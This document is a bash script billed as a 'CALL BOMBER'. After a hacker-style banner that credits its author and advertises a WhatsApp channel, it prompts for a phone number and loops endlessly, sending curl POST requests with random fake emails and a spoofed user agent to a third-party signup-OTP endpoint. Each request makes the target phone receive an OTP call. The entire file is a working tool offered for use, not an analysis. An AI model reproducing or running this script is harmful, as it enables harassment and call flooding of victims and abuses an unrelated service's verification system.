#!/bin/bash

# Hacker style banner
banner() {
    clear
    echo -e "\e[1;32m"
    echo " ██████╗ █████╗ ██╗     ██╗     "
    echo "██╔════╝██╔══██╗██║     ██║     "
    echo "██║     ███████║██║     ██║     "
    echo "██║     ██╔══██║██║     ██║     "
    echo "╚██████╗██║  ██║███████╗███████╗"
    echo " ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝"
    echo -e "\e[0;32m         CALL  BOMBER\e[0m"
    echo -e "\e[1;31m[+] Developed by: PROFESSOR-ABHEEBHAI\e[0m"
    echo -e "\e[1;34m[+] Join my WhatsApp Channel:\e[0m \e[4;36mhttps://whatsapp.com/channel/0029Vb6duo97YSd4TU5OUo3K\e[0m"
    echo ""
}

# Generate random email
generate_random_email() {
    head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 | sed 's/.*/&@gmail.com/'
}

# Graceful exit
cleanup() {
    tput cnorm
    echo -e "\n\e[0;31m[!] Exiting... CTRL+C detected.\e[0m"
    exit 0
}
trap cleanup INT

# Run banner
banner

# User input
read -p $'\033[1;32m[?] Enter phone number (e.g., 03001234567): \033[0m' phone_number
sleep 1

# API URL
API_URL="https://martbackend.herokuapp.com/user/signUpOtp"

# Start bombing loop
while true; do
    random_email=$(generate_random_email)
    JSON_BODY='{"phone":"'"$phone_number"'","email":"'"$random_email"'","name":"ali khan","referralCode":""}'

    echo -e "\n\e[1;36m[+] Sending call request to:\e[0m $phone_number"
    echo -e "\e[1;34m[+] Using email:\e[0m $random_email"

    curl -s -X POST "$API_URL" \
         -H "accept: application/json, text/plain, */*" \
         -H "Content-Type: application/json" \
         -H "User-Agent: okhttp/4.9.2" \
         -d "$JSON_BODY" \
         --compressed

    echo -e "\e[1;32m[✔] Request sent successfully!\e[0m"
    echo -e "\e[1;90m----------------------------------------\e[0m"

    sleep 3
done